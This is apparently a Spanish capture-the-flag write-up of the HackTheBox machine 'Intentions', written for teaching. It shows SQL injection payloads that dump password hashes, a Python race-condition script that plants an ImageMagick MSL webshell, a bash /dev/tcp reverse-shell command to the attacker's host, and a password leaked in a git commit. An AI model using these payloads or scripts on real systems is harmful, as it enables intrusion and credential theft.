---
title: 'Máquina Intentions'
description: 'Resolución de la máquina Intentions de HackTheBox'
categories: ['HackTheBox', 'Hard', 'Linux']
tags: ['SQLi', 'Code Analysis', 'API Enumeration','ImageMagick', 'Git credentials leak', 'Hash bruteforce']
logo: '/assets/writeups/intentions/logo.png'
---

Un sitio web de galeria vulnerable a una SQL Injection nos permitirá obtener unos hashes BCrypt que aunque sean robustos, nos permitirán acceder a una parte "oculta" de una API la cual se puede abusar para obtener un RCE, estando en la máquina analizaremos un proyecto git en el que hay credenciales en uno de los commits. Escalaremos privilegios abusando de un programa que escanea por material copyright en las imágenes del sitio.

## Reconocimiento

La máquina tiene dos puertos abiertos

```bash
# Nmap 7.93 scan initiated Sat Jul  1 15:00:59 2023 as: nmap -sS -Pn -n -vvv -p- --open --min-rate 150 -oN ports 10.129.242.11
Nmap scan report for 10.129.242.11
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-01 15:00:59 -04 for 161s
Not shown: 61444 closed tcp ports (reset), 4089 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jul  1 15:03:40 2023 -- 1 IP address (1 host up) scanned in 161.16 seconds
```

El sitio web nos pide autenticación, al acceder podemos ver que es un portal de imágenes

![Gallery](/assets/writeups/intentions/1.png)

Viendo el código HTML, podemos ver que la aplicación web utiliza Vue para su frontend, después de esto no hay nada más interesante que una sección de ajustes del perfil en donde podemos cambiar nuestro email, contraseña y géneros de imagen preferidos...

## Intrusión

### Acceso a la API v2

Probando a poner cosas raras en la sección de nuestros géneros de imágenes favoritos, el aplicativo parece no hacer nada, pero si vamos a la sección de nuestro Feed ahora nos tira un error:

![API Error](/assets/writeups/intentions/2.png)

El carácter que suele causar el error es la comilla simple, por lo que se puede intuir una SQL Injection en esta parte de la página. Como la parte de la web vulnerable elimina los espacios que se introducen hay que utilizar el carácter tab (`\t`) para que sirva como el espacio, también hay que hacer uso de paréntesis ya que parece que la inyección ocurre en una sentencia `FIND_IN_SET`.

Probando a poner el típico `')\tOR\t1=1\t--\t-` hace que la web nos retorne todas las imágenes, por lo que podemos decir que es vulnerable.

![SQLi](/assets/writeups/intentions/3.png)

Ya que podemos ver lo que devuelve la query SQL, podemos hacer uso de `UNION` para alterar los valores que se obtienen y retornan; el número de columnas podemos obtenerlo por simples pruebas con UNION, como esta:

```json
{
    "genres":"')\tUNION\tSELECT\t1,2,3,4,5\t--\t-"
}
```

Probando, obtenemos que el número de columnas que se seleccionan es de 5

```json
{
    "status":"success",
    "data":[
        {
            "id": 1,
            "file": "2",
            "genre": "3",
            "created_at": "1970-01-01T00:00:04.000000Z",
            "updated_at": "1970-01-01T00:00:05.000000Z",
            "url": "\/storage\/2"
        }
    ]
}
```

Ahora, ya que podemos ver cosas podemos tratar de obtener la base de datos actual, usuario de MySQL y las tablas de la base de datos actual

```json
{
    "genres":"')\tUNION\tSELECT\tuser(),database(),(SELECT\tgroup_concat(table_name)\tFROM\tinformation_schema.tables\tWHERE\ttable_schema=database()),4,5\t--\t-"
}
```

```json

{
    "status":"success",
    "data":[
        {
            "id": 0,
            "file": "intentions",
            "genre": "gallery_images,personal_access_tokens,migrations,users","created_at": "1970-01-01T00:00:04.000000Z",
            "updated_at": "1970-01-01T00:00:05.000000Z",
            "url": "\/storage\/laravel@localhost"
        }      
    ]
}
```

La tabla `users` es de nuestro interés, obtengamos sus columnas que contengan PII y hashes que nos puedan permitir elevar nuestro privilegio en el sitio; después de eso simplemente usaremos `group_concat` para tener una lista de todo lo interesante

```json
{
    "genres":"')\tUNION\tSELECT\t999,888,group_concat(email,':',password),4,5\tFROM\tusers\t--\t-"
}
```

```json
{"status":"success","data":[{"id":999,"file":"888","genre":"steve@intentions.htb:$2y$10$M\/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa,greg@intentions.htb:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m,hettie.rutherford@example.org:$2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6,nader.alva@example.org:$2y$10$WkBf7NFjzE5GI5SP7hB5\/uA9Bi\/BmoNFIUfhBye4gUql\/JIc\/GTE2,jones.laury@example.com:$2y$10$JembrsnTWIgDZH3vFo1qT.Zf\/hbphiPj1vGdVMXCk56icvD6mn\/ae,wanda93@example.org:$2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW,mwisoky@example.org:$2y$10$pAMvp3xPODhnm38lnbwPYuZN0B\/0nnHyTSMf1pbEoz6Ghjq.ecA7.,lura.zieme@example.org:$2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4\/dXv1jnfBVCpaR2h.SDDioy2,pouros.marcus@example.net:$2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3\/Kx82hjqbJFMO,mellie.okon@example.com:$2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx\/kpO\/XcKw1m,trace94@example.net:$2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W,kayleigh18@example.com:$2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi,tdach@example.com:$2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2.,lindsey.muller@example.org:$2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS
```

Hay demasiados correos con el dominio `example`, vamos a filtrar por los que sean de `intentions.htb`

```bash
steve@intentions.htb:$2y$10$M\/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa
greg@intentions.htb:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m
```

Vale, pero tenemos un inconveniente con estos hashes y es que **son bastante robustos**, la contraseña no parece ser débil o que esté en diccionarios típicos. ¿Qué hacemos entonces?, seguir viendo la web.

Viendo el código fuente de la página, vemos que hay una asset JavaScript de esta parte de la web

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Intentions Gallery</title>

        <script defer src="/js/gallery.js"></script>
        <script defer src="/js/mdb.js"></script>
        <link rel="stylesheet" href="/css/app.css">
    </head>
    <body class="antialiased">
        <div id="app">
            <sidebar></sidebar>
            <main>
                <router-view></router-view>
            </main>
        </div>
    </body>
</html>
```

Si seguimos viendo nos iremos dando cuenta de que existe una asset js para cada parte de la página que es un claro indicio de que se usa algún framework como Vue para el frontend, entonces podemos probar por nombres comunes de partes normalmente privilegiadas para ver si tienen algo interesante. Probando por `admin.js` veremos que existe, en efecto:

![Admin asset](/assets/writeups/intentions/4.png)

Al estar traspilado obviamente el código estará ofuscado, pero si vamos viendo bien nos podremos percatar de detalles interesante, especialmente los que están en la parte final del fichero

```js
... [snip]
([({"3"},[t._v("News")])]),t._v(" "),e("div",{staticClass:"card mb-4"},[e("div",{staticClass:"card-body"},[e("h5",{staticClass:"card-title"},[t._v("Legal Notice")]),t._v(" "),e("p",{staticClass:"card-text"},[t._v("\n                Recently we've had some copyrighted images slip through onto the gallery. \n                This could turn into a big issue for us so we are putting a new process in place that all new images must go through our legal council for approval.\n                Any new images you would like to add to the gallery should be provided to legal with all relevant copyright information.\n                I've assigned Greg to setup a process for legal to transfer approved images directly to the server to avoid any confusion or mishaps.\n                This will be the only way to add images to our gallery going forward.\n            ")])])]),t._v(" "),e("div",{staticClass:"card"},[e("div",{staticClass:"card-body"},[e("h5",{staticClass:"card-title"},[t._v("v2 API Update")]),t._v(" "),e("p",{staticClass:"card-text"},[t._v("\n                Hey team, I've deployed the v2 API to production and have started using it in the admin section. \n                Let me know if you spot any bugs. \n                This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text! \n                By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.\n                This should take care of the concerns raised by our users regarding our lack of HTTPS connection.\n            ")]),t._v(" "),e("p",{staticClass:"card-text"},[t._v("\n                The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I've included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some: "),e("a",{attrs:{rel:"noopener noreferrer nofollow",href:"https://www.php.net/manual/en/class.imagick.php"}},[t._v("Image Feature Reference")])])])])])}],!1,null,null,null).exports;n(333),window.Vue=n(538).ZP,window.VueRouter=n(195),Vue.component("sidebar",n(517).Z);var l=new VueRouter({routes:[{path:"/",component:u},{path:"/users",component:s},{path:"/images",component:o},{path:"/image/:id",component:r,name:"image",props:!0}],linkActiveClass:"",linkExactActiveClass:"active"});new Vue({el:"#app",router:l})})()})();
```

Están haciendo aviso de una actualización de la API del sitio, la versión 2; contiene nuevas carácteristicas como poder agregarle efectos especiales a las imágenes y que nos podemos autenticar solamente proporcionando el hash BCrypt de la contraseña del usuario, y nosotros tenemos 2 hashes...

Si te has fijado en las peticiones que estabámos haciendo vimos que todas iban al endpoint `/api/v1/*`, por lo que podemos intuir que el nuevo será `/api/v2/*`. Intentando ver si la ruta de autenticación es la misma que la de la API v1 daremos con ello.

```bash
❯ curl -v -d "" http://intentions.htb/api/v2/auth/login
*   Trying 10.10.11.220:80...
* Connected to intentions.htb (10.10.11.220) port 80
> POST /api/v2/auth/login HTTP/1.1
> Host: intentions.htb
> User-Agent: curl/8.3.0
> Accept: */*
> Content-Length: 0
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 422 Unprocessable Content
< Server: nginx/1.18.0 (Ubuntu)
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Cache-Control: no-cache, private
< Date: Wed, 11 Oct 2023 17:46:11 GMT
< X-RateLimit-Limit: 3600
< X-RateLimit-Remaining: 3598
< Access-Control-Allow-Origin: *
< 
* Connection #0 to host intentions.htb left intact
{"status":"error","errors":{"email":["The email field is required."],"hash":["The hash field is required."]}}
```

Dando el respectivo email y hash, lograremos obtener un token que nos pondremos como cookie para hacerle peticiones a esta API, como hemos visto que existen nuevas carácteristicas como una ruta para agregar efectos especiales a la imagen iremos a por ella.

```bash
❯ curl -v -H "Content-Type: application/json" -d "{\"email\":\"greg@intentions.htb\", \"hash\":\"\$2y\$10\$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m\"}" http://intentions.htb/api/v2/auth/login
*   Trying 10.10.11.220:80...
* Connected to intentions.htb (10.10.11.220) port 80
> POST /api/v2/auth/login HTTP/1.1
> Host: intentions.htb
> User-Agent: curl/8.3.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 102
... [snip]
< Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2OTcwNDY1MTAsImV4cCI6MTY5NzA2ODExMCwibmJmIjoxNjk3MDQ2NTEwLCJqdGkiOiJ5ZjA3NmJmQ2Q4c2swZ2pUIiwic3ViIjoiMiIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.st77jgsr2TyPi7cyjd64FlZnoNhYnoJVAE_Vzk9Gp3Y
```

### www-data

¿Cómo podemos saber las nuevas rutas que existen?, recordemos que tenemos una asset de un panel administrativo asi que veamos... buscando por coincidencias de `/api/v2` encontramos 4

![/api/v2](/assets/writeups/intentions/5.png)

Podemos ver unas cuantas rutas interesantes, pero vamos a fijarnos en la de `/api/v2/admin/image/modify`.

Enviándole una petición por POST, nos dice esto

```bash
❯ curl -b "token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2OTcwNDY4NzIsImV4cCI6MTY5NzA2ODQ3MiwibmJmIjoxNjk3MDQ2ODcyLCJqdGkiOiJwa0dTQlpDRzRiVENoa3NMIiwic3ViIjoiMiIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.jWp6176OU9xc44OFXiyjHX58bBhiyk2WryA9dLvwmzo" -d "" http://intentions.htb/api/v2/admin/image/modify
{"status":"error","errors":{"path":["The path field is required."],"effect":["The effect field is required."]}}%
```

El path debe ser la ruta a la imagen, dada `anto-meneghini-sJ4ix9_AjAc-unsplash.jpg` la ruta sería `public/food/anto-meneghini-sJ4ix9_AjAc-unsplash.jpg`; esto podemos verlo de la ruta de galería del sitio web principal, el efecto podemos intuirlo de la imagen anterior de la asset `admin.js`, es decir `Wave`, `Charcoal` y `Swirl`. Probando con esto que deducimos, funciona y el sitio nos devuelve una imagen codificada en base64 con el efecto aplicado.

```bash
❯ curl -v -b "token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2OTcwNDY4NzIsImV4cCI6MTY5NzA2ODQ3MiwibmJmIjoxNjk3MDQ2ODcyLCJqdGkiOiJwa0dTQlpDRzRiVENoa3NMIiwic3ViIjoiMiIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.jWp6176OU9xc44OFXiyjHX58bBhiyk2WryA9dLvwmzo" -H "Content-Type: application/json" -d "{\"path\":\"public/food/anto-meneghini-sJ4ix9_AjAc-unsplash.jpg\",\"effect\":\"Swirl\"}" http://intentions.htb/api/v2/admin/image/modify
*   Trying 10.10.11.220:80...
* Connected to intentions.htb (10.10.11.220) port 80
> POST /api/v2/admin/image/modify HTTP/1.1
> Host: intentions.htb
> User-Agent: curl/8.3.0
> Accept: */*
> Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2OTcwNDY4NzIsImV4cCI6MTY5NzA2ODQ3MiwibmJmIjoxNjk3MDQ2ODcyLCJqdGkiOiJwa0dTQlpDRzRiVENoa3NMIiwic3ViIjoiMiIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.jWp6176OU9xc44OFXiyjHX58bBhiyk2WryA9dLvwmzo
> Content-Type: application/json
> Content-Length: 79
> 
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Cache-Control: no-cache, private
< Date: Wed, 11 Oct 2023 18:05:52 GMT
< X-RateLimit-Limit: 3600
< X-RateLimit-Remaining: 3598
< Access-Control-Allow-Origin: *
< X-Frame-Options: SAMEORIGIN
< X-XSS-Protection: 1; mode=block
< X-Content-Type-Options: nosniff
< 
data:image/jpeg;base64 ... [snip]
```

¿Y qué hacemos con el endpoint?, en una parte de la asset del panel administrativo hay un texto que dice

> The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I've included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some: https://www.php.net/manual/en/class.imagick.php

Se está utilizando el iMagick de PHP para procesar las imágenes, analizando la documentación de la clase podemos ver que para empezar a manipular la imagen se debe crear un objeto utilizando de argumento la ubicación o dirección del fichero

![PHP When](/assets/writeups/intentions/6.png)

Nosotros podemos controlar eso... podemos verificarlo poniendo una URL de un servidor web que controlemos y viendo como la máquina intenta obtener el fichero que supuestamente está en el servidor que controlamos

```bash
❯ curl -v -b "token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2OTcwNDY4NzIsImV4cCI6MTY5NzA2ODQ3MiwibmJmIjoxNjk3MDQ2ODcyLCJqdGkiOiJwa0dTQlpDRzRiVENoa3NMIiwic3ViIjoiMiIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.jWp6176OU9xc44OFXiyjHX58bBhiyk2WryA9dLvwmzo" -H "Content-Type: application/json" -d "{\"path\":\"http://10.10.14.173:8000/asd\",\"effect\":\"Swirl\"}" http://intentions.htb/api/v2/admin/image/modify
*   Trying 10.10.11.220:80...
* Connected to intentions.htb (10.10.11.220) port 80
> POST /api/v2/admin/image/modify HTTP/1.1
> Host: intentions.htb
> User-Agent: curl/8.3.0
> Accept: */*
> Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2OTcwNDY4NzIsImV4cCI6MTY5NzA2ODQ3MiwibmJmIjoxNjk3MDQ2ODcyLCJqdGkiOiJwa0dTQlpDRzRiVENoa3NMIiwic3ViIjoiMiIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.jWp6176OU9xc44OFXiyjHX58bBhiyk2WryA9dLvwmzo
> Content-Type: application/json
> Content-Length: 56
> 
... [snip]
```

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.220 - - [11/Oct/2023 14:21:12] code 404, message File not found
10.10.11.220 - - [11/Oct/2023 14:21:12] "GET /asd HTTP/1.1" 404 -
```

Esto puede ser peligroso ya que ImageMagick no solo soporta formatos de imágenes, si no otros como PDF, PostScript y MSL.

El formato MSL (Magick Scripting Language) puede ser explotado para crear una webshell dentro del servidor si procesa PHP, como se ve en [este ejemplo](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) y lo mejor es que ImageMagick soporta este formato por defecto sin ningún tipo de extensión, pero vamos a tener que jugar algo a carreras para lograr obtener una ejecución de comandos.

Si leiste el artículo, habrás visto que el formato `msl:` no soporta el subformato HTTP, por lo que vamos a tener que aprovecharnos del nginx lanzando miles de peticiones con un archivo msl que se guardará en la forma de `/tmp/phpXXXXXX` donde $$ X \in [a-zA-Z0-9] $$, por suerte esto será simplemente como un tipo de condición de carrera ya que gracias al esquema `vid` podemos colocar simplemente `vid:msl:/tmp/php*` para hacer referencia al primer fichero que empieze por PHP que exista.

Tienes posibilidad de hacerlo manual con bash, pero en mi caso usaré un script de Python:

```python
import requests
import signal
from concurrent.futures import ThreadPoolExecutor;
from pwn import *

sess = requests.session()
token = "" # Put your API token here
logg = log.progress("Thingy")

def sigint(stack, buf):
    log.failure("Exiting...")
    exit(1)

def bruteforce():
        f = open("test.msl", "r") 
        file = {"test": ("test", f.read())}
        sess.post("http://intentions.htb/api/v2/admin/image/modify", files=file)
 
def test():
    cookie = {"token":token}
    res = sess.post("http://intentions.htb/api/v2/admin/image/modify", headers={"Content-Type":"application/json"}, json={"path":"vid:msl:/tmp/php*", "effect":"asd"}, cookies=cookie)
    if res.status_code != 422:
         return 0;

def check(result):
    if result.result() == 0:
        logg.success("Shell maybe uploaded, go to look in http://intentions.htb/test.php")
        os.kill(os.getpid(), 9) # Yeah, i'm insane

signal.signal(signal.SIGINT, sigint)

logg.status("Trying to get the file...")
threads = ThreadPoolExecutor(300);
while True:
    threads.submit(bruteforce)
    result = threads.submit(test)
    result.add_done_callback(check)   

```
{: file="msl_upload.py" }

El archivo MSL de polyglot que usaremos será el siguiente, pero necesitaremos escribir la webshell a algún lugar que exista en el sistema y podamos hacerle peticiones; de las rutas y tablas/columnas de la base de datos podemos deducir que se está usando Laravel como framework del backend, y las imágenes están siendo guardadas en `storage/<category>/<image>.jpg`, por lo que una ruta a probar sería `/var/www/html/intentions/storage/app/public/` o `/var/www/html/intentions/public/`, probemos con la segunda por ejemplo

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_GET['a']); ?>" />
<write filename="info:/var/www/html/intentions/public/test.php" />
</image>
```
{: file="test.msl" }

Tomará un caption y lo escribirá en esquema `info` dentro de la ruta que ves. Ejecutando el script de Python no toma mucho en escribir la webshell en la raíz de archivos públicos de Laravel; nuestra webshell estará en `test.php`

```bash
❯ python3 si.py
[+] Thingy: Shell maybe uploaded, go to look in http://intentions.htb/test.php
[1]    8550 killed     python3 si.py
❯ curl "http://intentions.htb/test.php?a=id"
caption:uid=33(www-data) gid=33(www-data) groups=33(www-data)
 CAPTION 120x120 120x120+0+0 16-bit sRGB 4.550u 0:05.816
```

Podemos lanzarnos ahora un reverse shell como `www-data` a nuestro equipo

```bash
❯ curl "http://intentions.htb/test.php?a=bash%20-c%20'bash%20-i%20>%26/dev/tcp/10.10.14.173/443%200>%261'"
----------------------------------------------------------------------------------
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.220 59232
bash: cannot set terminal process group (1068): Inappropriate ioctl for device
bash: no job control in this shell
www-data@intentions:~/html/intentions/public$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@intentions:~/html/intentions/public$ ^Z
[1]  + 9296 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 9296 continued  nc -lvnp 443
                                   reset xterm
www-data@intentions:~/html/intentions/public$ export TERM=xterm-256color
www-data@intentions:~/html/intentions/public$ source /etc/skel/.bashrc
www-data@intentions:~/html/intentions$ stty rows 36 columns 149
```

### greg

El sitio web está hecho en un proyecto de git

```bash
www-data@intentions:~/html/intentions$ ls -la
total 820
drwxr-xr-x  14 root     root       4096 Feb  2  2023 .
drwxr-xr-x   3 root     root       4096 Feb  2  2023 ..
-rw-r--r--   1 root     root       1068 Feb  2  2023 .env
drwxr-xr-x   8 root     root       4096 Feb  3  2023 .git
-rw-r--r--   1 root     root       3958 Apr 12  2022 README.md
drwxr-xr-x   7 root     root       4096 Apr 12  2022 app
-rwxr-xr-x   1 root     root       1686 Apr 12  2022 artisan
drwxr-xr-x   3 root     root       4096 Apr 12  2022 bootstrap
-rw-r--r--   1 root     root       1815 Jan 29  2023 composer.json
-rw-r--r--   1 root     root     300400 Jan 29  2023 composer.lock
drwxr-xr-x   2 root     root       4096 Jan 29  2023 config
drwxr-xr-x   5 root     root       4096 Apr 12  2022 database
-rw-r--r--   1 root     root       1629 Jan 29  2023 docker-compose.yml
drwxr-xr-x 534 root     root      20480 Jan 30  2023 node_modules
-rw-r--r--   1 root     root     420902 Jan 30  2023 package-lock.json
-rw-r--r--   1 root     root        891 Jan 30  2023 package.json
-rw-r--r--   1 root     root       1139 Jan 29  2023 phpunit.xml
drwxr-xr-x   5 www-data www-data   4096 Oct 12 16:52 public
drwxr-xr-x   7 root     root       4096 Jan 29  2023 resources
drwxr-xr-x   2 root     root       4096 Jun 19 11:22 routes
-rw-r--r--   1 root     root        569 Apr 12  2022 server.php
drwxr-xr-x   5 www-data www-data   4096 Apr 12  2022 storage
drwxr-xr-x   4 root     root       4096 Apr 12  2022 tests
drwxr-xr-x  45 root     root       4096 Jan 29  2023 vendor
-rw-r--r--   1 root     root        722 Feb  2  2023 webpack.mix.js
```

Pero no podemos acceder al historial de commits ni husmear porque el propietario de la carpeta `.git` es distinto al usuario en el que estamos...

```bash
www-data@intentions:~/html/intentions$ git status
fatal: detected dubious ownership in repository at '/var/www/html/intentions'
To add an exception for this directory, call:

	git config --global --add safe.directory /var/www/html/intentions
www-data@intentions:~/html/intentions$ git config --global --add safe.directory /var/www/html/intentions
error: could not lock config file /var/www/.gitconfig: Permission denied
```

Sin embargo, esto solo es una restricción del software de git ya que según parece tenemos total permiso de lectura en la carpeta `.git` del repositorio

```bash
www-data@intentions:~/html/intentions/.git$ ls -la
total 3168
drwxr-xr-x   8 root root    4096 Feb  3  2023 .
drwxr-xr-x  14 root root    4096 Feb  2  2023 ..
-rw-r--r--   1 root root      27 Feb  2  2023 COMMIT_EDITMSG
-rw-r--r--   1 root root      23 Feb  2  2023 HEAD
drwxr-xr-x   2 root root    4096 Feb  2  2023 branches
-rw-r--r--   1 root root      92 Feb  2  2023 config
-rw-r--r--   1 root root      73 Feb  2  2023 description
drwxr-xr-x   2 root root    4096 Feb  2  2023 hooks
-rw-r--r--   1 root root 3189676 Feb  3  2023 index
drwxr-xr-x   2 root root    4096 Feb  2  2023 info
drwxr-xr-x   3 root root    4096 Feb  2  2023 logs
drwxr-xr-x 260 root root    4096 Feb  2  2023 objects
drwxr-xr-x   4 root root    4096 Feb  2  2023 refs
```

Podemos simplemente comprimir todo el repositorio en un archivo .tar y pasarlo a nuestro equipo o moverlo a un directorio en el que puedas escribir dentro de la máquina para analizarlo, haciendo una de las acciones previas ya podremos ver el log de commits sin ningún incoveniente

```bash
www-data@intentions:~/html/intentions$ mkdir /dev/shm/repo
www-data@intentions:~/html/intentions$ cp -r .git /dev/shm/repo
www-data@intentions:~/html/intentions$ cd !$
www-data@intentions:/dev/shm/repo$ git branch
* master 
```

Hay unos cuantos commits interesantes, como el `f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4`

```bash
www-data@intentions:/dev/shm/repo$ git log
commit 1f29dfde45c21be67bb2452b46d091888ed049c3 (HEAD -> master)
Author: steve <steve@intentions.htb>
Date:   Mon Jan 30 15:29:12 2023 +0100

    Fix webpack for production

commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
Author: greg <greg@intentions.htb>
Date:   Thu Jan 26 09:21:52 2023 +0100

    Test cases did not work on steve's local database, switching to user factory per his advice

commit 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
Author: greg <greg@intentions.htb>
Date:   Wed Jan 25 20:45:12 2023 +0100

    Adding test cases for the API!

commit d7ef022d3bc4e6d02b127fd7dcc29c78047f31bd
Author: steve <steve@intentions.htb>
Date:   Fri Jan 20 14:19:32 2023 +0100

    Initial v2 commit
```

Analizando el diff entre el commit mencionado y los anteriores encontramos algo interesante...

```bash
www-data@intentions:/dev/shm/repo$ git diff f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4 36b4287cf2fb356d868e71dc1ac90fc8fa99d319 
diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
index 0586d51..f57e37b 100644
--- a/tests/Feature/Helper.php
+++ b/tests/Feature/Helper.php
@@ -8,14 +8,12 @@ class Helper extends TestCase
 {
     public static function getToken($test, $admin = false) {
         if($admin) {
-            $user = User::factory()->admin()->create();
+            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+            return $res->headers->get('Authorization');
         } 
         else {
-            $user = User::factory()->create();
+            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+            return $res->headers->get('Authorization');
         }
-        
-        $token = Auth::login($user);
-        $user->delete();
-        return $token;
     }
}
```

Esta contraseña es la de greg en este servidor, y en su directorio personal podremos ver la primera flag.

```bash
www-data@intentions:/dev/shm$ rm -rf repo # No queremos dejar evidencias
www-data@intentions:/dev/shm$ su greg
Password: 
$ bash
greg@intentions:/dev/shm$ cd
greg@intentions:~$ ls
dmca_check.sh  dmca_hashes.test  user.txt
greg@intentions:~$ cat user.txt
100fdfb7549d8389172b45f06d******
```

## Escalada de privilegios

Hay un binario con la capabilidad `CAP_DAC_READ_SEARCH`, que da permisos a poder leer cualquier archivo del sistema sin ninguna restricción

```bash
greg@intentions:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/opt/scanner/scanner cap_dac_read_search=ep
```

El help de este programa dice lo siguiente

```
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

	This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
	This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
	File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

	The hash blacklist file should be maintained as a single LABEL:MD5 per line.
	Please avoid using extra colons in the label as that is not currently supported.

	Expected output:
	1. Empty if no matches found
	2. A line for every match, example:
		[+] {LABEL} matches {FILE}

  -c string
    	Path to image file to check. Cannot be combined with -d
  -d string
    	Path to image directory to check. Cannot be combined with -c
  -h string
    	Path to colon separated hash file. Not compatible with -p
  -l int
    	Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p	[Debug] Print calculated file hash. Only compatible with -c
  -s string
    	Specific hash to check against. Not compatible with -h
```

La principal utilidad para lo que fue diseñado es para checkear si hay material con copyright en un fichero comparando el hash MD5 de su contenido o una porción de este con otro hash o una lista de estos, no hace nada más. No es abusable pero dado que tiene una capabilidad si que podriamos utilizarlo para ver cosas que no deberíamos ver 

> También es de mencionar que este programa está escrito en GoLang, analizarlo con Ghidra puede ser un poco costoso pero no imposible, sin embargo no utiliza ninguna función fuera de `open` o `write` que podamos abusar.
